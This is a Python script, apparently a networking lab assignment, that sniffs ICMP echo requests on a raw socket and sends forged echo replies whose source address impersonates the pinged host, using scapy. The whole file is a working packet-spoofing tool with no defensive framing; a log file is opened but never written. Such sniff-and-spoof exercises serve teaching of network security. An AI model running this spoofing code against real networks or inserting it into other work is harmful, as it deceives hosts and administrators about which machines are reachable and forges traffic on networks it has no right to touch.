import socket
import struct

from scapy.arch import get_if
from scapy.layers.inet import *
from scapy.all import *
from scapy.layers.l2 import get_if_hwaddr

def parse_ethernet_header(data):
    eth_header = struct.unpack('!6s6sH', data[:14])
    dest_mac = ':'.join('%02x' % b for b in eth_header[0])
    src_mac = ':'.join('%02x' % b for b in eth_header[1])
    eth_protocol = socket.ntohs(eth_header[2])
    return dest_mac, src_mac, eth_protocol, data[14:]

# Function to parse ICMP header
def parse_icmp_header(data):
    icmp_header = struct.unpack('!BBH', data[:4])
    id, sequence_number = struct.unpack('!HH', data[4:8])
    type = icmp_header[0]
    code = icmp_header[1]
    checksum = icmp_header[2]
    return type, code, checksum, data[4:], id, sequence_number

# Function to parse IP header
def parse_ip_header(data):
    ip_header = struct.unpack('!BBHHHBBH4s4s', data[:20])
    version_ihl = ip_header[0]
    version = version_ihl >> 4
    ihl = (version_ihl & 0xF) * 4
    ttl = ip_header[5]
    protocol = ip_header[6]
    src_ip = socket.inet_ntoa(ip_header[8])
    dest_ip = socket.inet_ntoa(ip_header[9])
    return version, ihl, ttl, protocol, src_ip, dest_ip, data[ihl:]

def spoof_reply(src_ip, dest_ip, id, sequence_number, ttl, icmp_data, src_mac, dest_mac):
    reply = IP(src=dest_ip, dst=src_ip, ttl=ttl)/ICMP(type=0, code=0, id=id, seq=sequence_number) / icmp_data[4:]
    # eth_header = Ether(dst=src_mac)
    # reply = eth_header / reply


    print("Sending spoofed reply to " + src_ip + " from " + dest_ip + " sequence number " + str(sequence_number))
    print(len(reply))
    send(reply, verbose=0)


def sniff_packets():
    # Create a raw socket to capture packets
    sniffer = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
    last_seq = -1
    print("Sniffing packets...")

    # Open the file to write packet information
    filename = "322653411_318471109.txt"
    with open(filename, "a") as file:
        while True:
            # Capture a packet and retrieve the raw data
            raw_data, addr = sniffer.recvfrom(65535)

            # Parse the Ethernet header
            dest_mac, src_mac, eth_protocol, packet_data = parse_ethernet_header(raw_data)

            if eth_protocol == 8:  # IP packets
                version, ihl, ttl, protocol, src_ip, dest_ip, ip_data = parse_ip_header(packet_data)

                if protocol == 1:  # ICMP packets
                    icmp_type, code, checksum, icmp_data, id, sequence_number = parse_icmp_header(ip_data)

                    if icmp_type == 8:  # ICMP Echo Request
                        if sequence_number != last_seq:
                            last_seq = sequence_number
                            spoof_reply(src_ip, dest_ip, id, sequence_number, ttl, icmp_data, src_mac, dest_mac)

sniff_packets()
